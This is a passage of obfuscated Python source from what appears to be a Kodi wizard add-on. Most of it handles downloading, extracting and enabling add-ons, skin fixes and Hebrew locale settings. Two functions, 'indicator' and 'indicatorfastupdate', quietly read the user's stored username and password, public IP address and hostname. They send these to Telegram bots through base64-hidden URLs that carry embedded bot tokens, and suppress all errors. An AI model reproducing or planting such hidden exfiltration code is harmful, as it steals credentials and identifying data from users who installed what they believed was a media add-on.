        O0OO0O0OOO0OO0000 =float (OOO0O00OOO00O00OO )/O0OOOOO00OO00O00O #line:3465
        O0OO0O0OOO0OO0000 =round (O0OO0O0OOO0OO0000 *100 ,2 )#line:3466
        OOOOOOO00OOOOO0OO =OOO0O00OOO00O00OO /(1024 *1024 )#line:3467
        OOOOOO0O0O00O00O0 =O0OOOOO00OO00O00O /(1024 *1024 )#line:3468
        OO00000O0OOOOOOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOOO00OOOOO0OO ,'teal',OOOOOO0O0O00O00O0 )#line:3469
        if (time .time ()-O0OO0OO000O0O00OO )>0 :#line:3470
          OO000OOO0OO00OOOO =OOO0O00OOO00O00OO /(time .time ()-O0OO0OO000O0O00OO )#line:3471
          OO000OOO0OO00OOOO =OO000OOO0OO00OOOO /1024 #line:3472
        else :#line:3473
         OO000OOO0OO00OOOO =0 #line:3474
        O0O0OO000OOOO0O00 ='KB'#line:3475
        if OO000OOO0OO00OOOO >=1024 :#line:3476
           OO000OOO0OO00OOOO =OO000OOO0OO00OOOO /1024 #line:3477
           O0O0OO000OOOO0O00 ='MB'#line:3478
        if OO000OOO0OO00OOOO >0 and not O0OO0O0OOO0OO0000 ==100 :#line:3479
            OOO00OOO0O0OOO000 =(O0OOOOO00OO00O00O -OOO0O00OOO00O00OO )/OO000OOO0OO00OOOO #line:3480
        else :#line:3481
            OOO00OOO0O0OOO000 =0 #line:3482
        OOOOOOOO00O000O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO000OOO0OO00OOOO ,O0O0OO000OOOO0O00 )#line:3483
        O0O0O0OOO0O0000O0 .update (int (O0OO0O0OOO0OO0000 ),"Downloading "+name ,OO00000O0OOOOOOOO ,OOOOOOOO00O000O00 )#line:3485
  O00OO00OOO0O0O0OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3488
  O0OOOOO0O0O0O0OO0 .close ()#line:3490
  extract (OOO00O0O000O00O0O ,O00OO00OOO0O0O0OO ,O0O0O0OOO0O0000O0 )#line:3492
  if os .path .exists (O00OO00OOO0O0O0OO +'/scakemyer-script.quasar.burst'):#line:3493
    if os .path .exists (O00OO00OOO0O0O0OO +'/script.quasar.burst'):#line:3494
     shutil .rmtree (O00OO00OOO0O0O0OO +'/script.quasar.burst',ignore_errors =False )#line:3495
    os .rename (O00OO00OOO0O0O0OO +'/scakemyer-script.quasar.burst',O00OO00OOO0O0O0OO +'/script.quasar.burst')#line:3496
  if os .path .exists (O00OO00OOO0O0O0OO +'/plugin.video.kmediatorrent-master'):#line:3498
    if os .path .exists (O00OO00OOO0O0O0OO +'/plugin.video.kmediatorrent'):#line:3499
     shutil .rmtree (O00OO00OOO0O0O0OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3500
    os .rename (O00OO00OOO0O0O0OO +'/plugin.video.kmediatorrent-master',O00OO00OOO0O0O0OO +'/plugin.video.kmediatorrent')#line:3501
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3502
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3503
  try :#line:3504
    os .remove (OOO00O0O000O00O0O )#line:3505
  except :#line:3506
    pass #line:3507
  O0O0O0OOO0O0000O0 .close ()#line:3508
def dis_or_enable_addon (O0OO000O00O000O00 ,O0O00000OOO0OO0OO ,enable ="true"):#line:3509
    import json #line:3510
    O00O0O0000O0000O0 ='"%s"'%O0OO000O00O000O00 #line:3511
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OO000O00O000O00 )and enable =="true":#line:3512
        logging .warning ('already Enabled')#line:3513
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OO000O00O000O00 )#line:3514
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OO000O00O000O00 )and enable =="false":#line:3515
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OO000O00O000O00 )#line:3516
    else :#line:3517
        O00O00OO00OOO000O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00O0O0000O0000O0 ,enable )#line:3518
        O0O0OO0O000OOOO0O =xbmc .executeJSONRPC (O00O00OO00OOO000O )#line:3519
        O0OO00OOOO0O0O00O =json .loads (O0O0OO0O000OOOO0O )#line:3520
        if enable =="true":#line:3521
            xbmc .log ("### Enabled %s, response = %s"%(O0OO000O00O000O00 ,O0OO00OOOO0O0O00O ))#line:3522
        else :#line:3523
            xbmc .log ("### Disabled %s, response = %s"%(O0OO000O00O000O00 ,O0OO00OOOO0O0O00O ))#line:3524
    if O0O00000OOO0OO0OO =='auto':#line:3525
     return True #line:3526
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3527
def chunk_report (O00OOOOO0O0OOOOO0 ,OOO0OO0O00O00O000 ,OO000O0O0O0OO0000 ):#line:3528
   O000O000O0O0O0O00 =float (O00OOOOO0O0OOOOO0 )/OO000O0O0O0OO0000 #line:3529
   O000O000O0O0O0O00 =round (O000O000O0O0O0O00 *100 ,2 )#line:3530
   if O00OOOOO0O0OOOOO0 >=OO000O0O0O0OO0000 :#line:3532
      sys .stdout .write ('\n')#line:3533
def chunk_read (O000O0O000OOO00O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3535
   import time #line:3536
   O0O0O0OO0O0O0O0O0 =int (filesize )*1000000 #line:3537
   O0OOOOOOO0OOOO000 =0 #line:3539
   O00O0O0O00O00O00O =time .time ()#line:3540
   O0O00O0O00OO00OO0 =0 #line:3541
   logging .warning ('Downloading')#line:3543
   with open (destination ,"wb")as O0O00O000O00O0OOO :#line:3544
    while 1 :#line:3545
      OOOO00OOOO00O0O0O =time .time ()-O00O0O0O00O00O00O #line:3546
      OO00O00OO000OOOO0 =int (O0O00O0O00OO00OO0 *chunk_size )#line:3547
      OOOO00OOO0OOO00O0 =O000O0O000OOO00O0 .read (chunk_size )#line:3548
      O0O00O000O00O0OOO .write (OOOO00OOO0OOO00O0 )#line:3549
      O0O00O000O00O0OOO .flush ()#line:3550
      O0OOOOOOO0OOOO000 +=len (OOOO00OOO0OOO00O0 )#line:3551
      O0O0O0OOOOO0O00O0 =float (O0OOOOOOO0OOOO000 )/O0O0O0OO0O0O0O0O0 #line:3552
      O0O0O0OOOOO0O00O0 =round (O0O0O0OOOOO0O00O0 *100 ,2 )#line:3553
      if int (OOOO00OOOO00O0O0O )>0 :#line:3554
        O00000000O0O0OOO0 =int (OO00O00OO000OOOO0 /(1024 *OOOO00OOOO00O0O0O ))#line:3555
      else :#line:3556
         O00000000O0O0OOO0 =0 #line:3557
      if O00000000O0O0OOO0 >1024 and not O0O0O0OOOOO0O00O0 ==100 :#line:3558
          O00OO0O0000OOO00O =int (((O0O0O0OO0O0O0O0O0 -OO00O00OO000OOOO0 )/1024 )/(O00000000O0O0OOO0 ))#line:3559
      else :#line:3560
          O00OO0O0000OOO00O =0 #line:3561
      if O00OO0O0000OOO00O <0 :#line:3562
        O00OO0O0000OOO00O =0 #line:3563
      dp .update (int (O0O0O0OOOOO0O00O0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O0O0OOOOO0O00O0 ,OO00O00OO000OOOO0 /(1024 *1024 ),O0O0O0OO0O0O0O0O0 /(1000 *1000 ),O00000000O0O0OOO0 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00OO0O0000OOO00O ,60 ))#line:3564
      if dp .iscanceled ():#line:3565
         dp .close ()#line:3566
         break #line:3567
      if not OOOO00OOO0OOO00O0 :#line:3568
         break #line:3569
      if report_hook :#line:3571
         report_hook (O0OOOOOOO0OOOO000 ,chunk_size ,O0O0O0OO0O0O0O0O0 )#line:3572
      O0O00O0O00OO00OO0 +=1 #line:3573
   logging .warning ('END Downloading')#line:3574
   return O0OOOOOOO0OOOO000 #line:3575
def googledrive_download (OOO0O0O0O0O00O000 ,OOO000O0O0000000O ,OO0O0OOO000000O0O ,O0O0OOOO00000O0OO ):#line:3577
    OO0OO00OOOO0000OO =[]#line:3581
    OO0O0O0O0000OOO00 =OOO0O0O0O0O00O000 .split ('=')#line:3582
    OOO0O0O0O0O00O000 =OO0O0O0O0000OOO00 [len (OO0O0O0O0000OOO00 )-1 ]#line:3583
    def OOOO0O0O0OOO0OOO0 (O0OO000000000OOOO ):#line:3585
        for OOO0OOO0OO00O00OO in O0OO000000000OOOO :#line:3587
            logging .warning ('cookie.name')#line:3588
            logging .warning (OOO0OOO0OO00O00OO .name )#line:3589
            OO0O0O0OO00OO0000 =OOO0OOO0OO00O00OO .value #line:3590
            if 'download_warning'in OOO0OOO0OO00O00OO .name :#line:3591
                logging .warning (OOO0OOO0OO00O00OO .value )#line:3592
                logging .warning ('cookie.value')#line:3593
                return OOO0OOO0OO00O00OO .value #line:3594
            return OO0O0O0OO00OO0000 #line:3595
        return None #line:3597
    def OO000OOO00OOOOO00 (O0OO00O0OO000O0OO ,O00OOO0OOO0OOO0OO ):#line:3599
        OOO0O0O0OOO000OO0 =32768 #line:3601
        O0O0OOOOOO0000000 =time .time ()#line:3602
        with open (O00OOO0OOO0OOO0OO ,"wb")as O000O0OOOOO0OOOO0 :#line:3604
            OO0O0O0000OOOOOOO =1 #line:3605
            OO0000OOO000000OO =32768 #line:3606
            try :#line:3607
                OO00OOO00000OOO0O =int (O0OO00O0OO000O0OO .headers .get ('content-length'))#line:3608
                print ('file total size :',OO00OOO00000OOO0O )#line:3609
            except TypeError :#line:3610
                print ('using dummy length !!!')#line:3611
                OO00OOO00000OOO0O =int (O0O0OOOO00000O0OO )*1000000 #line:3612
            for OO0O0O00000000000 in O0OO00O0OO000O0OO .iter_content (OOO0O0O0OOO000OO0 ):#line:3613
                if OO0O0O00000000000 :#line:3614
                    O000O0OOOOO0OOOO0 .write (OO0O0O00000000000 )#line:3615
                    O000O0OOOOO0OOOO0 .flush ()#line:3616
                    OO0OOO0O00O0O0O00 =time .time ()-O0O0OOOOOO0000000 #line:3617
                    O0O0OO0000O00000O =int (OO0O0O0000OOOOOOO *OO0000OOO000000OO )#line:3618
                    if OO0OOO0O00O0O0O00 ==0 :#line:3619
                        OO0OOO0O00O0O0O00 =0.1 #line:3620
                    OOO000OOO00O0OOOO =int (O0O0OO0000O00000O /(1024 *OO0OOO0O00O0O0O00 ))#line:3621
                    OOO0O00O00O0O0O0O =int (OO0O0O0000OOOOOOO *OO0000OOO000000OO *100 /OO00OOO00000OOO0O )#line:3622
                    if OOO000OOO00O0OOOO >1024 and not OOO0O00O00O0O0O0O ==100 :#line:3623
                      OO00OO0000O0O00OO =int (((OO00OOO00000OOO0O -O0O0OO0000O00000O )/1024 )/(OOO000OOO00O0OOOO ))#line:3624
                    else :#line:3625
                      OO00OO0000O0O00OO =0 #line:3626
                    OO0O0OOO000000O0O .update (int (OOO0O00O00O0O0O0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0O00O00O0O0O0O ,O0O0OO0000O00000O /(1024 *1024 ),OO00OOO00000OOO0O /(1000 *1000 ),OOO000OOO00O0OOOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO00OO0000O0O00OO ,60 ))#line:3628
                    OO0O0O0000OOOOOOO +=1 #line:3629
                    if OO0O0OOO000000O0O .iscanceled ():#line:3630
                     OO0O0OOO000000O0O .close ()#line:3631
                     break #line:3632
    O0OO0OO0O000O0OO0 ="https://docs.google.com/uc?export=download"#line:3633
    import urllib2 #line:3638
    import cookielib #line:3639
    from cookielib import CookieJar #line:3641
    O0O00OO0O0OOOOOOO =CookieJar ()#line:3643
    O0O00OOOOO00O000O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0O00OO0O0OOOOOOO ))#line:3644
    O00OO0OO0O0O0OOO0 ={'id':OOO0O0O0O0O00O000 }#line:3646
    OOO0000O0OOOOO000 =urllib .urlencode (O00OO0OO0O0O0OOO0 )#line:3647
    logging .warning (O0OO0OO0O000O0OO0 +'&'+OOO0000O0OOOOO000 )#line:3648
    OO0O00O00O0O00OO0 =O0O00OOOOO00O000O .open (O0OO0OO0O000O0OO0 +'&'+OOO0000O0OOOOO000 )#line:3649
    O00000O000O00OOOO =OO0O00O00O0O00OO0 .read ()#line:3650
    for O0OOOOOO0O0O0O000 in O0O00OO0O0OOOOOOO :#line:3652
         logging .warning (O0OOOOOO0O0O0O000 )#line:3653
    O00OO000O00OOOO00 =OOOO0O0O0OOO0OOO0 (O0O00OO0O0OOOOOOO )#line:3654
    logging .warning (O00OO000O00OOOO00 )#line:3655
    if O00OO000O00OOOO00 :#line:3656
        OOOO00OOO0O000O0O ={'id':OOO0O0O0O0O00O000 ,'confirm':O00OO000O00OOOO00 }#line:3657
        O000O00O000000O0O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3658
        OOO0000O0OOOOO000 =urllib .urlencode (OOOO00OOO0O000O0O )#line:3659
        OO0O00O00O0O00OO0 =O0O00OOOOO00O000O .open (O0OO0OO0O000O0OO0 +'&'+OOO0000O0OOOOO000 )#line:3660
        chunk_read (OO0O00O00O0O00OO0 ,report_hook =chunk_report ,dp =OO0O0OOO000000O0O ,destination =OOO000O0O0000000O ,filesize =O0O0OOOO00000O0OO )#line:3661
    return (OO0OO00OOOO0000OO )#line:3665
def kodi17Fix ():#line:3666
	O0OOO0OOO0OOO0O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3667
	OOOO0000OO00OO00O =[]#line:3668
	for OO0OO0O0O0O0OOOO0 in sorted (O0OOO0OOO0OOO0O0O ,key =lambda OO000O00O000000OO :OO000O00O000000OO ):#line:3669
		OOOOO0OOO00OO0OOO =os .path .join (OO0OO0O0O0O0OOOO0 ,'addon.xml')#line:3670
		if os .path .exists (OOOOO0OOO00OO0OOO ):#line:3671
			O00000OOOOO0O0OOO =OO0OO0O0O0O0OOOO0 .replace (ADDONS ,'')[1 :-1 ]#line:3672
			O000OOOO0O0OOO0O0 =open (OOOOO0OOO00OO0OOO )#line:3673
			O0OOO0O000O0O00OO =O000OOOO0O0OOO0O0 .read ()#line:3674
			OOO0OO00OOOO00OO0 =parseDOM (O0OOO0O000O0O00OO ,'addon',ret ='id')#line:3675
			O000OOOO0O0OOO0O0 .close ()#line:3676
			try :#line:3677
				O0O0O0OOO0OO00OOO =xbmcaddon .Addon (id =OOO0OO00OOOO00OO0 [0 ])#line:3678
			except :#line:3679
				try :#line:3680
					log ("%s was disabled"%OOO0OO00OOOO00OO0 [0 ],xbmc .LOGDEBUG )#line:3681
					OOOO0000OO00OO00O .append (OOO0OO00OOOO00OO0 [0 ])#line:3682
				except :#line:3683
					try :#line:3684
						log ("%s was disabled"%O00000OOOOO0O0OOO ,xbmc .LOGDEBUG )#line:3685
						OOOO0000OO00OO00O .append (O00000OOOOO0O0OOO )#line:3686
					except :#line:3687
						if len (OOO0OO00OOOO00OO0 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00000OOOOO0O0OOO ,xbmc .LOGERROR )#line:3688
						else :log ("Unabled to enable: %s"%OO0OO0O0O0O0OOOO0 ,xbmc .LOGERROR )#line:3689
	if len (OOOO0000OO00OO00O )>0 :#line:3690
		O00O00OO00OO0O00O =0 #line:3691
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3692
		for OOO00OOOO00O0O0O0 in OOOO0000OO00OO00O :#line:3693
			O00O00OO00OO0O00O +=1 #line:3694
			O0O00OO00O000OOO0 =int (percentage (O00O00OO00OO0O00O ,len (OOOO0000OO00OO00O )))#line:3695
			DP .update (O0O00OO00O000OOO0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00OOOO00O0O0O0 ))#line:3696
			addonDatabase (OOO00OOOO00O0O0O0 ,1 )#line:3697
			if DP .iscanceled ():break #line:3698
		if DP .iscanceled ():#line:3699
			DP .close ()#line:3700
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3701
			sys .exit ()#line:3702
		DP .close ()#line:3703
	forceUpdate ()#line:3704
def indicator ():#line:3706
       try :#line:3707
          import json #line:3708
          wiz .log ('FRESH MESSAGE')#line:3709
          OOOO0O0OOO0OO00OO =(ADDON .getSetting ("user"))#line:3710
          O0OO0000O00O0OO00 =(ADDON .getSetting ("pass"))#line:3711
          OOOOO00OOO00O0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3712
          O00OO0OO0O0OO0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3713
          OOOO00O000O00O0OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3714
          O000OOO00O000O0OO =str (json .loads (OOOO00O000O00O0OO )['ip'])#line:3715
          O00O00000O000OOOO =OOOO0O0OOO0OO00OO #line:3716
          OO00OOO000O0O000O =O0OO0000O00O0OO00 #line:3717
          import socket #line:3718
          OOOO00O000O00O0OO =urllib2 .urlopen (O00OO0OO0O0OO0OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00O00000O000OOOO +' - '+OO00OOO000O0O000O +' - '+OOOOO00OOO00O0000 +' - '+O000OOO00O000O0OO ).readlines ()#line:3719
       except :pass #line:3721
def indicatorfastupdate ():#line:3723
       try :#line:3724
          import json #line:3725
          wiz .log ('FRESH MESSAGE')#line:3726
          O0OO0OO00OOOOOO0O =(ADDON .getSetting ("user"))#line:3727
          O0OO0O0O0000O00OO =(ADDON .getSetting ("pass"))#line:3728
          O00O0O0OO0000OOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3729
          O0O00O0000O0O0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3731
          O00OO0O0OOOOOOO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3732
          OO0OOO0OO0O000O00 =str (json .loads (O00OO0O0OOOOOOO0O )['ip'])#line:3733
          O00O0OO00O0O00OO0 =O0OO0OO00OOOOOO0O #line:3734
          OO0OO00O000OO0OO0 =O0OO0O0O0000O00OO #line:3735
          import socket #line:3737
          O00OO0O0OOOOOOO0O =urllib2 .urlopen (O0O00O0000O0O0OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00O0OO00O0O00OO0 +' - '+OO0OO00O000OO0OO0 +' - '+O00O0O0OO0000OOO0 +' - '+OO0OOO0OO0O000O00 ).readlines ()#line:3738
       except :pass #line:3740
def skinfix18 ():#line:3742
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3743
		OOOOO0O00OOO0O00O =wiz .workingURL (SKINID18DDONXML )#line:3744
		if OOOOO0O00OOO0O00O ==True :#line:3745
			OOO000O00000000O0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3746
			if len (OOO000O00000000O0 )>0 :#line:3747
				O0O00O00O0O0OOO00 ='%s-%s.zip'%(SKINID18 ,OOO000O00000000O0 [0 ])#line:3748
				O00OOO00O00OOOO0O =wiz .workingURL (SKIN18ZIPURL +O0O00O00O0O0OOO00 )#line:3749
				if O00OOO00O00OOOO0O ==True :#line:3750
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3751
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3752
					O000O0OO00OOO0OO0 =os .path .join (PACKAGES ,O0O00O00O0O0OOO00 )#line:3753
					try :os .remove (O000O0OO00OOO0OO0 )#line:3754
					except :pass #line:3755
					downloader .download (SKIN18ZIPURL +O0O00O00O0O0OOO00 ,O000O0OO00OOO0OO0 ,DP )#line:3756
					extract .all (O000O0OO00OOO0OO0 ,HOME ,DP )#line:3757
					try :#line:3758
						O00OO0O0OO0000OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3759
						O000OO000O0O0O000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3760
						os .rename (O00OO0O0OO0000OO0 ,O000OO000O0O0O000 )#line:3761
					except :#line:3762
						pass #line:3763
					try :#line:3764
						OO0O000OOO0OO00O0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O000O00OOOOO0O0O0 =OO0O000OOO0OO00O0 .read ();OO0O000OOO0OO00O0 .close ()#line:3765
						OOO00O0O0000000O0 =wiz .parseDOM (O000O00OOOOO0O0O0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3766
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00O0O0000000O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3767
					except :#line:3768
						pass #line:3769
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3770
					DP .close ()#line:3771
					xbmc .sleep (500 )#line:3772
					wiz .forceUpdate (True )#line:3773
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3774
				else :#line:3775
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3776
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00OOO00O00OOOO0O ,xbmc .LOGERROR )#line:3777
			else :#line:3778
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3779
		else :#line:3780
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3781
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3782
def skinfix17 ():#line:3783
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3784
		O0O00O0OO0O0000O0 =wiz .workingURL (SKINID17DDONXML )#line:3785
		if O0O00O0OO0O0000O0 ==True :#line:3786
			OOOO0O0O0O0OOOO0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3787
			if len (OOOO0O0O0O0OOOO0O )>0 :#line:3788
				O0OOO0OO0O000000O ='%s-%s.zip'%(SKINID17 ,OOOO0O0O0O0OOOO0O [0 ])#line:3789
				O00OOO0O00O0OO0O0 =wiz .workingURL (SKIN17ZIPURL +O0OOO0OO0O000000O )#line:3790
				if O00OOO0O00O0OO0O0 ==True :#line:3791
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3792
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3793
					OO0O0OO0OOOO00000 =os .path .join (PACKAGES ,O0OOO0OO0O000000O )#line:3794
					try :os .remove (OO0O0OO0OOOO00000 )#line:3795
					except :pass #line:3796
					downloader .download (SKIN17ZIPURL +O0OOO0OO0O000000O ,OO0O0OO0OOOO00000 ,DP )#line:3797
					extract .all (OO0O0OO0OOOO00000 ,HOME ,DP )#line:3798
					try :#line:3799
						OO0O0O00OOOOO00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3800
						OOO000O00O0OO0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3801
						os .rename (OO0O0O00OOOOO00O0 ,OOO000O00O0OO0OOO )#line:3802
					except :#line:3803
						pass #line:3804
					try :#line:3805
						OO0O0O0O0O0OOO000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0O0OOO000OO00OOO =OO0O0O0O0O0OOO000 .read ();OO0O0O0O0O0OOO000 .close ()#line:3806
						O00O00OO00000OO0O =wiz .parseDOM (O0O0OOO000OO00OOO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3807
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00OO00000OO0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3808
					except :#line:3809
						pass #line:3810
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3811
					DP .close ()#line:3812
					xbmc .sleep (500 )#line:3813
					wiz .forceUpdate (True )#line:3814
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3815
				else :#line:3816
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3817
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00OOO0O00O0OO0O0 ,xbmc .LOGERROR )#line:3818
			else :#line:3819
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3820
		else :#line:3821
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3822
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3823
def fix17update ():#line:3824
	if KODIV >=17 and KODIV <18 :#line:3825
		wiz .kodi17Fix ()#line:3826
		xbmc .sleep (4000 )#line:3827
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3828
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3829
		fixfont ()#line:3830
		OOOOOO00O0OO00O0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3831
		try :#line:3833
			O00OOO0000O000OOO =open (OOOOOO00O0OO00O0O ,'r')#line:3834
			OOO0OO00OO0O0OO0O =O00OOO0000O000OOO .read ()#line:3835
			O00OOO0000O000OOO .close ()#line:3836
			OOO0O0O0000O000OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3837
			O000OO0000OO000O0 =re .compile (OOO0O0O0000O000OO ).findall (OOO0OO00OO0O0OO0O )[0 ]#line:3838
			O00OOO0000O000OOO =open (OOOOOO00O0OO00O0O ,'w')#line:3839
			O00OOO0000O000OOO .write (OOO0OO00OO0O0OO0O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O000OO0000OO000O0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3840
			O00OOO0000O000OOO .close ()#line:3841
		except :#line:3842
				pass #line:3843
		wiz .kodi17Fix ()#line:3844
		OOOOOO00O0OO00O0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3845
		try :#line:3846
			O00OOO0000O000OOO =open (OOOOOO00O0OO00O0O ,'r')#line:3847
			OOO0OO00OO0O0OO0O =O00OOO0000O000OOO .read ()#line:3848
			O00OOO0000O000OOO .close ()#line:3849
			OOO0O0O0000O000OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3850
			O000OO0000OO000O0 =re .compile (OOO0O0O0000O000OO ).findall (OOO0OO00OO0O0OO0O )[0 ]#line:3851
			O00OOO0000O000OOO =open (OOOOOO00O0OO00O0O ,'w')#line:3852
			O00OOO0000O000OOO .write (OOO0OO00OO0O0OO0O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O000OO0000OO000O0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3853
			O00OOO0000O000OOO .close ()#line:3854
		except :#line:3855
				pass #line:3856
		swapSkins ('skin.Premium.mod')#line:3857
def fix18update ():#line:3859
	if KODIV >=18 :#line:3860
		xbmc .sleep (4000 )#line:3861
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3862
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3863
		fixfont ()#line:3864
		O00O00O00OOO00OO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3865
		try :#line:3866
			OOO0000OOO0OOO0O0 =open (O00O00O00OOO00OO0 ,'r')#line:3867
			O0O0O0O0000OO0OO0 =OOO0000OOO0OOO0O0 .read ()#line:3868
			OOO0000OOO0OOO0O0 .close ()#line:3869
			OO0O0O0OOO000O0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3870
